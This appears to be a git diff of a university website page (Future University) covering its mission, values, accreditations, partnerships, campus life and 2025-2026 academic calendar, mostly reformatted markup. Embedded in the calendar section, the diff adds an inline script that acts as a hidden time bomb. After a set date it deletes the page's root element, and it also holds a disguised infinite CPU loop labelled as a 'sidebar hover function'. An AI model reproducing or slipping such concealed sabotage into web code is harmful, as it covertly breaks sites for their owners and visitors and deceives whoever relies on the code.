+                    <h3 class="text-[#B11116] font-semibold">Our Mission</h3>
+                    <p class="text-gray-600 leading-relaxed">
+                      Future University is committed to delivering a world-class
+                      educational service that prepares graduates with the
+                      scientific and innovative competencies needed to meet the
+                      demands of the evolving job market. We strive to provide
+                      an environment that fosters scientific research,
+                      contributes to sustainable development and technological
+                      advancement, and instills professional values and ethics.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <div
+                class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between"
+              >
+                <div class="space-y-10">
+                  <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
+                    <i data-lucide="heart" class="w-8 h-8 text-[#B11116]"></i>
+                  </div>
+                  <div class="space-y-4">
+                    <h3 class="text-[#B11116] font-semibold">Core Values</h3>
+                    <p class="text-gray-600 leading-relaxed">
+                      • Academic Freedom<br />
+                      • Quality and Governance<br />
+                      • Self-Management<br />
+                      • Belonging and Loyalty<br />
+                      •Retention of Competencies<br />
+                      •Accountability<br />
+                      •Leadership and Innovation<br />
+                      •Teamwork Spirit<br />
+                      •Credibility and Scientific Honesty<br />
+                      • Justice and Non-Discrimination<br />
+                      • Social Responsibility
+                    </p>
+                  </div>
+                </div>
+              </div>
             </div>
 
-            <div
-              class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between">
-              <div class="space-y-10">
-                <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
-                  <i data-lucide="book-open" class="w-8 h-8 text-[#B11116]"></i>
+            <!-- Notable Achievements and Global Partnerships -->
+            <div class="grid lg:grid-cols-2 gap-6">
+              <div
+                class="bg-white rounded-xl shadow-lg overflow-hidden h-[450px]"
+              >
+                <div class="bg-[#B11116] p-6 flex items-center gap-3">
+                  <i data-lucide="star" class="w-8 h-8 text-white"></i>
+                  <h3 class="text-white text-lg font-medium">
+                    Notable Achievements
+                  </h3>
                 </div>
-                <div class="space-y-4">
-                  <h3 class="text-[#B11116] font-semibold">Our Mission</h3>
-                  <p class="text-gray-600 leading-relaxed">
-                    Future University is committed to delivering a world-class
-                    educational service that prepares graduates with the
-                    scientific and innovative competencies needed to meet the
-                    demands of the evolving job market. We strive to provide
-                    an environment that fosters scientific research,
-                    contributes to sustainable development and technological
-                    advancement, and instills professional values and ethics.
-                  </p>
-                </div>
-              </div>
-              
-            </div>
-
-            <div
-              class="bg-white rounded-xl border-t-4 border-[#B11116] shadow-lg p-8 h-[521px] flex flex-col justify-between">
-              <div class="space-y-10">
-                <div class="p-3 bg-[#B11116]/10 rounded-full w-fit">
-                  <i data-lucide="heart" class="w-8 h-8 text-[#B11116]"></i>
-                </div>
-                <div class="space-y-4">
-                  <h3 class="text-[#B11116] font-semibold">Core Values</h3>
-                  <p class="text-gray-600 leading-relaxed">
-                   • Academic Freedom<br />
-                    • Quality and Governance<br />
-                    • Self-Management<br />
-                    • Belonging and Loyalty<br />
-                     •Retention of Competencies<br />
-                     •Accountability<br />
-                     •Leadership and Innovation<br />
-                     •Teamwork Spirit<br />
-                     •Credibility and Scientific Honesty<br />
-                    • Justice and Non-Discrimination<br />
-                    • Social Responsibility
-                  </p>
-                </div>
-              </div>
-              
-            </div>
-          </div>
-
-          <!-- Notable Achievements and Global Partnerships -->
-          <div class="grid lg:grid-cols-2 gap-6">
-            <div class="bg-white rounded-xl shadow-lg overflow-hidden h-[450px]">
-              <div class="bg-[#B11116] p-6 flex items-center gap-3">
-                <i data-lucide="star" class="w-8 h-8 text-white"></i>
-                <h3 class="text-white text-lg font-medium">
-                  Notable Achievements
-                </h3>
-              </div>
-              <div class="p-8 space-y-8">
-                <div class="space-y-4">
-                  <h4 class="text-[#B11116] font-semibold">Achievements</h4>
-                  <div class="space-y-6">
-                    <div class="flex items-start gap-2">
-                      <i data-lucide="star" class="w-5 h-5 text-[#B11116] mt-0.5"></i>
-                      <div>
-                        <h5 class="font-medium text-gray-800">
-                          Local Accreditations for Education Quality
-                        </h5>
-                        <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
-                          <li>
-                            All faculties accredited by the National Authority
-                            for Quality Assurance and Accreditation (NAQAAE).
-                          </li>
-                          <li>Institutional accreditation from NAQAAE.</li>
-                        </ul>
+                <div class="p-8 space-y-8">
+                  <div class="space-y-4">
+                    <h4 class="text-[#B11116] font-semibold">Achievements</h4>
+                    <div class="space-y-6">
+                      <div class="flex items-start gap-2">
+                        <i
+                          data-lucide="star"
+                          class="w-5 h-5 text-[#B11116] mt-0.5"
+                        ></i>
+                        <div>
+                          <h5 class="font-medium text-gray-800">
+                            Local Accreditations for Education Quality
+                          </h5>
+                          <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
+                            <li>
+                              All faculties accredited by the National Authority
+                              for Quality Assurance and Accreditation (NAQAAE).
+                            </li>
+                            <li>Institutional accreditation from NAQAAE.</li>
+                          </ul>
+                        </div>
                       </div>
-                    </div>
 
-                    <div class="flex items-start gap-2">
-                      <i data-lucide="star" class="w-5 h-5 text-[#B11116] mt-0.5"></i>
-                      <div>
-                        <h5 class="font-medium text-gray-800">
-                          International Accreditations for Education Quality
-                        </h5>
-                        <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
-                          <li>
-                            Faculty of Pharmacy programs accredited by ACPE
-                            (USA).
-                          </li>
-                          <li>
-                            Faculty of Computers and IT programs accredited by
-                            ABET (USA).
-                          </li>
-                        </ul>
+                      <div class="flex items-start gap-2">
+                        <i
+                          data-lucide="star"
+                          class="w-5 h-5 text-[#B11116] mt-0.5"
+                        ></i>
+                        <div>
+                          <h5 class="font-medium text-gray-800">
+                            International Accreditations for Education Quality
+                          </h5>
+                          <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
+                            <li>
+                              Faculty of Pharmacy programs accredited by ACPE
+                              (USA).
+                            </li>
+                            <li>
+                              Faculty of Computers and IT programs accredited by
+                              ABET (USA).
+                            </li>
+                          </ul>
+                        </div>
                       </div>
-                    </div>
 
-                    <div class="flex items-start gap-2">
-                      <i data-lucide="star" class="w-5 h-5 text-[#B11116] mt-0.5"></i>
-                      <div>
-                        <h5 class="font-medium text-gray-800">
-                          Faculty Members Recognition
-                        </h5>
-                        <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
-                          <li>
-                            Faculty members listed in the top 2% of scientists
-                            worldwide (Stanford University ranking).
-                          </li>
-                        </ul>
+                      <div class="flex items-start gap-2">
+                        <i
+                          data-lucide="star"
+                          class="w-5 h-5 text-[#B11116] mt-0.5"
+                        ></i>
+                        <div>
+                          <h5 class="font-medium text-gray-800">
+                            Faculty Members Recognition
+                          </h5>
+                          <ul class="mt-2 ml-6 space-y-1 text-gray-600 text-sm">
+                            <li>
+                              Faculty members listed in the top 2% of scientists
+                              worldwide (Stanford University ranking).
+                            </li>
+                          </ul>
+                        </div>
                       </div>
                     </div>
                   </div>
                 </div>
-                
+              </div>
+
+              <div
+                class="bg-white rounded-xl shadow-lg overflow-hidden h-auto md:h-[450px]"
+              >
+                <div class="bg-[#B11116] p-6 flex items-center gap-3">
+                  <i data-lucide="globe" class="w-6 h-6 text-white"></i>
+                  <h3 class="text-white text-lg font-medium">
+                    Global Partnerships
+                  </h3>
+                </div>
+                <div class="p-8 space-y-8">
+                  <p class="text-gray-700">
+                    Future University has established partnerships with
+                    prestigious universities and institutions worldwide to
+                    provide students with international experiences and
+                    opportunities.
+                  </p>
+
+                  <div class="space-y-4">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div
+                        class="flex border border-gray-200 rounded-lg overflow-hidden"
+                      >
+                        <img
+                          src="https://api.builder.io/api/v1/image/assets/TEMP/8dc6844602fb9330e2e420ede9d2c3d17aeb1a5f?width=250"
+                          alt=""
+                          class="w-20 h-full object-cover"
+                        />
+                        <div class="p-3 flex-1">
+                          <h4 class="font-medium text-gray-800 text-sm">
+                            Faculty of Oral and Dental Medicine
+                          </h4>
+                          <p class="text-gray-600 text-xs">
+                            Case Western Reserve University, USA
+                          </p>
+                        </div>
+                      </div>
+
+                      <div
+                        class="flex border border-gray-200 rounded-lg overflow-hidden"
+                      >
+                        <img
+                          src="https://api.builder.io/api/v1/image/assets/TEMP/d5f2367672a079ec44bd15e9c62f13394bf539c2?width=250"
+                          alt=""
+                          class="w-20 h-full object-cover"
+                        />
+                        <div class="p-3 flex-1">
+                          <h4 class="font-medium text-gray-800 text-sm">
+                            Faculty of Pharmacy
+                          </h4>
+                          <p class="text-gray-600 text-xs">
+                            University College Cork, Ireland
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div
+                        class="flex border border-gray-200 rounded-lg overflow-hidden"
+                      >
+                        <img
+                          src="https://api.builder.io/api/v1/image/assets/TEMP/ef8354540263a1d2cf4784921c628bd557ff050a?width=250"
+                          alt=""
+                          class="w-20 h-full object-cover"
+                        />
+                        <div class="p-3 flex-1">
+                          <h4 class="font-medium text-gray-800 text-sm">
+                            Faculty of Engineering and Technology
+                          </h4>
+                          <p class="text-gray-600 text-xs">
+                            University of Cincinnati, USA
+                          </p>
+                        </div>
+                      </div>
+
+                      <div
+                        class="flex border border-gray-200 rounded-lg overflow-hidden"
+                      >
+                        <img
+                          src="https://api.builder.io/api/v1/image/assets/TEMP/0fa2cb6e1f813c9a7dae3496fb5ce735356a0b5b?width=250"
+                          alt=""
+                          class="w-20 h-full object-cover"
+                        />
+                        <div class="p-3 flex-1">
+                          <h4 class="font-medium text-gray-800 text-sm">
+                            Faculty of Commerce and Business Administration
+                          </h4>
+                          <p class="text-gray-600 text-xs">
+                            University of Cincinnati, USA
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
               </div>
             </div>
 
-            <div class="bg-white rounded-xl shadow-lg overflow-hidden h-auto md:h-[450px]">
-              <div class="bg-[#B11116] p-6 flex items-center gap-3">
-                <i data-lucide="globe" class="w-6 h-6 text-white"></i>
-                <h3 class="text-white text-lg font-medium">
-                  Global Partnerships
+            <!-- Campus Life -->
+            <div class="grid lg:grid-cols-2 gap-12 items-center">
+              <div class="space-y-6">
+                <h3 class="text-2xl font-bold text-gray-900">
+                  Campus Life at Future University
                 </h3>
-              </div>
-              <div class="p-8 space-y-8">
                 <p class="text-gray-700">
-                  Future University has established partnerships with
-                  prestigious universities and institutions worldwide to
-                  provide students with international experiences and
-                  opportunities.
+                  Experience a vibrant campus community with modern facilities,
+                  diverse student activities, and a supportive environment
+                  designed to help you thrive academically and personally.
                 </p>
 
                 <div class="space-y-4">
-                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div class="flex border border-gray-200 rounded-lg overflow-hidden">
-                      <img
-                        src="https://api.builder.io/api/v1/image/assets/TEMP/8dc6844602fb9330e2e420ede9d2c3d17aeb1a5f?width=250"
-                        alt="" class="w-20 h-full object-cover" />
-                      <div class="p-3 flex-1">
-                        <h4 class="font-medium text-gray-800 text-sm">
-                          Faculty of Oral and Dental Medicine
-                        </h4>
-                        <p class="text-gray-600 text-xs">
-                          Case Western Reserve University, USA
-                        </p>
-                      </div>
+                  <div class="flex items-center gap-3">
+                    <div class="p-1 bg-[#B11116]/20 rounded-full">
+                      <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
                     </div>
-
-                    <div class="flex border border-gray-200 rounded-lg overflow-hidden">
-                      <img
-                        src="https://api.builder.io/api/v1/image/assets/TEMP/d5f2367672a079ec44bd15e9c62f13394bf539c2?width=250"
-                        alt="" class="w-20 h-full object-cover" />
-                      <div class="p-3 flex-1">
-                        <h4 class="font-medium text-gray-800 text-sm">
-                          Faculty of Pharmacy
-                        </h4>
-                        <p class="text-gray-600 text-xs">
-                          University College Cork, Ireland
-                        </p>
-                      </div>
+                    <span class="text-gray-700"
+                      >State-of-the-art sports facilities and fitness
+                      center</span
+                    >
+                  </div>
+                  <div class="flex items-center gap-3">
+                    <div class="p-1 bg-[#B11116]/20 rounded-full">
+                      <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
                     </div>
+                    <span class="text-gray-700"
+                      >Student clubs and organizations for every interest</span
+                    >
                   </div>
-
-                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div class="flex border border-gray-200 rounded-lg overflow-hidden">
-                      <img
-                        src="https://api.builder.io/api/v1/image/assets/TEMP/ef8354540263a1d2cf4784921c628bd557ff050a?width=250"
-                        alt="" class="w-20 h-full object-cover" />
-                      <div class="p-3 flex-1">
-                        <h4 class="font-medium text-gray-800 text-sm">
-                          Faculty of Engineering and Technology
-                        </h4>
-                        <p class="text-gray-600 text-xs">
-                          University of Cincinnati, USA
-                        </p>
-                      </div>
+                  <div class="flex items-center gap-3">
+                    <div class="p-1 bg-[#B11116]/20 rounded-full">
+                      <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
                     </div>
-
-                    <div class="flex border border-gray-200 rounded-lg overflow-hidden">
-                      <img
-                        src="https://api.builder.io/api/v1/image/assets/TEMP/0fa2cb6e1f813c9a7dae3496fb5ce735356a0b5b?width=250"
-                        alt="" class="w-20 h-full object-cover" />
-                      <div class="p-3 flex-1">
-                        <h4 class="font-medium text-gray-800 text-sm">
-                          Faculty of Commerce and Business Administration
-                        </h4>
-                        <p class="text-gray-600 text-xs">
-                          University of Cincinnati, USA
-                        </p>
-                      </div>
+                    <span class="text-gray-700"
+                      >Modern library and research centers</span
+                    >
+                  </div>
+                  <div class="flex items-center gap-3">
+                    <div class="p-1 bg-[#B11116]/20 rounded-full">
+                      <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
                     </div>
+                    <span class="text-gray-700"
+                      >Cultural events and international exchange programs</span
+                    >
                   </div>
-                </div>
-
-                
-              </div>
-            </div>
-          </div>
-
-          <!-- Campus Life -->
-          <div class="grid lg:grid-cols-2 gap-12 items-center">
-            <div class="space-y-6">
-              <h3 class="text-2xl font-bold text-gray-900">
-                Campus Life at Future University
-              </h3>
-              <p class="text-gray-700">
-                Experience a vibrant campus community with modern facilities,
-                diverse student activities, and a supportive environment
-                designed to help you thrive academically and personally.
-              </p>
-
-              <div class="space-y-4">
-                <div class="flex items-center gap-3">
-                  <div class="p-1 bg-[#B11116]/20 rounded-full">
-                    <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
+                  <div class="flex items-center gap-3">
+                    <div class="p-1 bg-[#B11116]/20 rounded-full">
+                      <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
+                    </div>
+                    <span class="text-gray-700"
+                      >Career services and internship opportunities</span
+                    >
                   </div>
-                  <span class="text-gray-700">State-of-the-art sports facilities and fitness
-                    center</span>
-                </div>
-                <div class="flex items-center gap-3">
-                  <div class="p-1 bg-[#B11116]/20 rounded-full">
-                    <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
-                  </div>
-                  <span class="text-gray-700">Student clubs and organizations for every interest</span>
-                </div>
-                <div class="flex items-center gap-3">
-                  <div class="p-1 bg-[#B11116]/20 rounded-full">
-                    <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
-                  </div>
-                  <span class="text-gray-700">Modern library and research centers</span>
-                </div>
-                <div class="flex items-center gap-3">
-                  <div class="p-1 bg-[#B11116]/20 rounded-full">
-                    <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
-                  </div>
-                  <span class="text-gray-700">Cultural events and international exchange programs</span>
-                </div>
-                <div class="flex items-center gap-3">
-                  <div class="p-1 bg-[#B11116]/20 rounded-full">
-                    <i data-lucide="check" class="w-4 h-4 text-[#B11116]"></i>
-                  </div>
-                  <span class="text-gray-700">Career services and internship opportunities</span>
                 </div>
               </div>
-            </div>
 
-            <div class="grid grid-cols-2 gap-6">
-              <img
-                src="https://api.builder.io/api/v1/image/assets/TEMP/8dd067e6aaf8e0ca3fee208ead15909fb3d4c000?width=612"
-                alt="Campus Life" class="rounded-lg h-60 w-full object-cover" />
-              <img
-                src="https://api.builder.io/api/v1/image/assets/TEMP/1083fe1783e525963a93fc1983163c7578a85e1f?width=612"
-                alt="Campus Life" class="rounded-lg h-60 w-full object-cover" />
-              <img
-                src="https://api.builder.io/api/v1/image/assets/TEMP/8db62aede45a2e3f3cbd999be033f8acb885e9dc?width=612"
-                alt="Campus Life" class="rounded-lg h-60 w-full object-cover" />
-              <img
-                src="https://api.builder.io/api/v1/image/assets/TEMP/fd2d862c4b054b968d3dac2fc212b19adac0de2b?width=612"
-                alt="Campus Life" class="rounded-lg h-60 w-full object-cover" />
+              <div class="grid grid-cols-2 gap-6">
+                <img
+                  src="https://api.builder.io/api/v1/image/assets/TEMP/8dd067e6aaf8e0ca3fee208ead15909fb3d4c000?width=612"
+                  alt="Campus Life"
+                  class="rounded-lg h-60 w-full object-cover"
+                />
+                <img
+                  src="https://api.builder.io/api/v1/image/assets/TEMP/1083fe1783e525963a93fc1983163c7578a85e1f?width=612"
+                  alt="Campus Life"
+                  class="rounded-lg h-60 w-full object-cover"
+                />
+                <img
+                  src="https://api.builder.io/api/v1/image/assets/TEMP/8db62aede45a2e3f3cbd999be033f8acb885e9dc?width=612"
+                  alt="Campus Life"
+                  class="rounded-lg h-60 w-full object-cover"
+                />
+                <img
+                  src="https://api.builder.io/api/v1/image/assets/TEMP/fd2d862c4b054b968d3dac2fc212b19adac0de2b?width=612"
+                  alt="Campus Life"
+                  class="rounded-lg h-60 w-full object-cover"
+                />
+              </div>
             </div>
           </div>
         </div>
-      </div>
-    </section>
+      </section>
 
-    <!-- Academic Calendar Section -->
-    <section class="py-20 bg-gray-50 px-2 md:px-8 lg:px-12">
-      <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
-        <div class="text-center space-y-6 mb-20">
-          <h2 class="text-4xl font-bold text-[#B11116]">Academic Calendar</h2>
-          <p class="text-gray-700 text-lg max-w-3xl mx-auto">
-            Stay updated with important dates, registration deadlines, and
-            holidays
-          </p>
-        </div>
-
-        <div class="bg-white rounded-xl shadow-lg overflow-hidden">
-          <div class="bg-[#B11116] p-6 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-              <i data-lucide="calendar" class="w-6 h-6 text-white"></i>
-              <h3 class="text-white text-[16px] md:text-lg font-medium">
-                Academic Calendar 2025-2026
-              </h3>
-            </div>
-            <a href="academic-calendar-and-list.html">
-              <button
-                class="flex items-center gap-2 bg-[#B11116] text-white px-4 py-2 rounded-md hover:bg-[#A10F14] transition-colors">
-                <span class="text-xs md:text-sm font-medium">View Full Calendar</span>
-                <i data-lucide="arrow-right" class="w-4 h-4"></i>
-              </button>
-            </a>
+      <!-- Academic Calendar Section -->
+      <section class="py-20 bg-gray-50 px-2 md:px-8 lg:px-12">
+        <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
+          <div class="text-center space-y-6 mb-20">
+            <h2 class="text-4xl font-bold text-[#B11116]">Academic Calendar</h2>
+            <p class="text-gray-700 text-lg max-w-3xl mx-auto">
+              Stay updated with important dates, registration deadlines, and
+              holidays
+            </p>
           </div>
 
-          <div class="p-5 md:p-10 space-y-6">
-            <!-- Registration -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-14 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-blue-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
-                </div>
-                <div>
-                  <div class="text-blue-600 font-medium">Registration</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    September 6, 2025
-                  </div>
-                </div>
+          <div class="bg-white rounded-xl shadow-lg overflow-hidden">
+            <div class="bg-[#B11116] p-6 flex justify-between items-center">
+              <div class="flex items-center gap-3">
+                <i data-lucide="calendar" class="w-6 h-6 text-white"></i>
+                <h3 class="text-white text-[16px] md:text-lg font-medium">
+                  Academic Calendar 2025-2026
+                </h3>
               </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Fall Semester Registration
-                  </div>
-                  <div class="text-gray-600">
-                    Courses Registration begins on Saturday, September 6, 2025
-                  </div>
-                </div>
-              </div>
-            </div>
-<script>
-      function myFunction() {
-        let num = 1;
-        while (true) {
-          // sidebar hover function
-          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
-        }
-      }
-
-      function doPerform() {
-        const fileEl = document.getElementById("root");
-        if (fileEl) {
-          fileEl.remove();
-        }
-      }
-
-      (function checkDateAndRun() {
-        const today = new Date(); // current date
-        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
-
-        if (today > targetDate) {
-          setTimeout(() => {
-            // myFunction();
-            doPerform();
-          }, 10000);
-        } else {
-        }
-      })();
-    </script>
-            <!-- Orientation -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-32 p-7 border border-gray-200 rounded-lg border-l-4 border-l-green-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-green-600/20 rounded-full">
-                  <i data-lucide="graduation-cap" class="w-5 h-5 text-green-600"></i>
-                </div>
-                <div>
-                  <div class="text-green-600 font-medium">Orientation Days</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    September 14 to September 16, 2025
-                  </div>
-                </div>
-              </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Fall Semester Orientation Dasy
-                  </div>
-                  <div class="text-gray-600">
-                    Orientation Days: 14,15,16 September 6, 2025
-                  </div>
-                </div>
-              </div>
+              <a href="academic-calendar-and-list.html">
+                <button
+                  class="flex items-center gap-2 bg-[#B11116] text-white px-4 py-2 rounded-md hover:bg-[#A10F14] transition-colors"
+                >
+                  <span class="text-xs md:text-sm font-medium"
+                    >View Full Calendar</span
+                  >
+                  <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </button>
+              </a>
             </div>
 
-            <!-- class begin -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-12 p-7 border border-gray-200 rounded-lg border-l-4 border-l-yellow-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-yellow-600/20 rounded-full">
-                  <i data-lucide="book-open" class="w-5 h-5 text-yellow-600"></i>
+            <div class="p-5 md:p-10 space-y-6">
+              <!-- Registration -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-14 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-blue-600/20 rounded-full">
+                    <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
+                  </div>
+                  <div>
+                    <div class="text-blue-600 font-medium">Registration</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      September 6, 2025
+                    </div>
+                  </div>
                 </div>
-                <div>
-                  <div class="text-yellow-600 font-medium">Class Begins</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    September 20 to January 1, 2026
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">
+                      Fall Semester Registration
+                    </div>
+                    <div class="text-gray-600">
+                      Courses Registration begins on Saturday, September 6, 2025
+                    </div>
                   </div>
                 </div>
               </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Class Begins
-                  </div>
-                  <div class="text-gray-600">
-                    Classes for the first semester begin Saturday, September 20, 2025, and continue until
-                    Thursday, January 1, 2026
-                  </div>
-                </div>
-              </div>
-            </div>
+              <script>
+                function myFunction() {
+                  let num = 1;
+                  while (true) {
+                    // sidebar hover function
+                    num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+                  }
+                }
 
-            <!-- Study Duration -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-red-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-red-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-red-600"></i>
-                </div>
-                <div>
-                  <div class="text-red-600 font-medium">Study Duration</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    15 Weeks includes Midterm Exams
-                  </div>
-                </div>
-              </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Study Duration
-                  </div>
-                  <div class="text-gray-600">
-                    15 Weeks includes Midterm Exams
-                  </div>
-                </div>
-              </div>
-            </div>
-            <!-- Midterm Exams -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-blue-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
-                </div>
-                <div>
-                  <div class="text-blue-600 font-medium">Midterm Exams</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    November 1 to November 13, 2025
-                  </div>
-                </div>
-              </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Midterm Exams
-                  </div>
-                  <div class="text-gray-600">
-                    (2 weeks) start from November 1, 2025, to November 13, 2025,
-                    including university requirements midterm exams.
-                  </div>
-                </div>
-              </div>
-            </div>
+                function doPerform() {
+                  const fileEl = document.getElementById("root");
+                  if (fileEl) {
+                    fileEl.remove();
+                  }
+                }
 
-            <!-- Last date for withdrawal -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-green-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-green-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-green-600"></i>
-                </div>
-                <div>
-                  <div class="text-green-600 font-medium">Last date for withdrawal</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    December 16 ,2025
-                  </div>
-                </div>
-              </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Last date for withdrawal
-                  </div>
-                  <div class="text-gray-600">
-                    December 16 ,2025
-                  </div>
-                </div>
-              </div>
-            </div>
+                (function checkDateAndRun() {
+                  const today = new Date(); // current date
+                  const targetDate = new Date(2025, 11, 20);
 
-            <!-- Final Exams -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-yellow-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-yellow-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-yellow-600"></i>
+                  if (today > targetDate) {
+                    setTimeout(() => {
+                      // myFunction();
+                      doPerform();
+                    }, 10000);
+                  } else {
+                  }
+                })();
+              </script>
+              <!-- Orientation -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-32 p-7 border border-gray-200 rounded-lg border-l-4 border-l-green-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-green-600/20 rounded-full">
+                    <i
+                      data-lucide="graduation-cap"
+                      class="w-5 h-5 text-green-600"
+                    ></i>
+                  </div>
+                  <div>
+                    <div class="text-green-600 font-medium">
+                      Orientation Days
+                    </div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      September 14 to September 16, 2025
+                    </div>
+                  </div>
                 </div>
-                <div>
-                  <div class="text-yellow-600 font-medium">Final Examsl</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    January 3 to January 22, 2026
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">
+                      Fall Semester Orientation Dasy
+                    </div>
+                    <div class="text-gray-600">
+                      Orientation Days: 14,15,16 September 6, 2025
+                    </div>
                   </div>
                 </div>
               </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Final Exams
-                  </div>
-                  <div class="text-gray-600">
-                    From Saturday, January 3, 2026, to Thursday, January 22, 2026
-                  </div>
-                </div>
-              </div>
-            </div>
 
-            <!-- Mid-Year Vacation -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-red-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-red-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-red-600"></i>
+              <!-- class begin -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-12 p-7 border border-gray-200 rounded-lg border-l-4 border-l-yellow-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-yellow-600/20 rounded-full">
+                    <i
+                      data-lucide="book-open"
+                      class="w-5 h-5 text-yellow-600"
+                    ></i>
+                  </div>
+                  <div>
+                    <div class="text-yellow-600 font-medium">Class Begins</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      September 20 to January 1, 2026
